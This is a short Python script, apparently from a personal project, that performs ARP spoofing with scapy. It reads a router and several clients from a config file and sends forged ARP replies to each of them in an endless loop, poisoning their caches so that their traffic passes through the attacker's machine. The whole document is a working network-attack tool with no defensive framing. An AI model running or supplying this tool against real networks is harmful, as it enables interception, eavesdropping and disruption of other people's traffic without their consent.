#!/usr/bin/env python3

"""Easy multiple arp spooferinator"""

import argparse
import ctypes
import logging
import os
from signal import SIGINT, signal
import sys
from scapy.all import ARP, send


# https://stackoverflow.com/questions/1026431/cross-platform-way-to-check-admin-rights-in-a-python-script-under-windows/1026626#1026626
def is_admin():
    """Checks if the program is running as admin"""
    try:
        return os.getuid() == 0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0


# https://www.devdungeon.com/content/python-catch-sigint-ctrl-c
def handler(signal_received, frame):
    """Handles SIGINT gracefully"""
    # Handle any cleanup here
    print('SIGINT or CTRL-C detected. Exiting gracefully')
    sys.exit(0)


def read_config(filename):
    """Reads and parses config file with format \"IP MAC\" with the first line being the router"""
    config_file = open(filename, "r")
    output = []
    lines = config_file.read().splitlines()
    for line in lines:
        output.append(line.split(' '))
    config_file.close()
    return output


def send_packets(router_ip, client_ip, router_mac, client_mac):
    """Sends ARP packets to router and client"""
    arpspoofed = ARP(op=2, psrc=router_ip, pdst=client_ip, hwdst=router_mac)
    send(arpspoofed)
    arpspoofed = ARP(op=2, psrc=client_ip, pdst=router_ip, hwdst=client_mac)
    send(arpspoofed)


def main():
    """Main function"""
    if not is_admin():
        logging.critical("This program needs to be run as administrator for raw socket privileges")
        sys.exit(1)

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "config_file",
        help="config file with format \"IP MAC\" without quotes and with the router on line one"
    )
    args = parser.parse_args()
    config = read_config(args.config_file)
    # The important part.
    while True:
        for i in range(1, len(config)):
            send_packets(config[0][0], config[i][0], config[0][1], config[i][1])


if __name__ == '__main__':
    signal(SIGINT, handler)
    main()
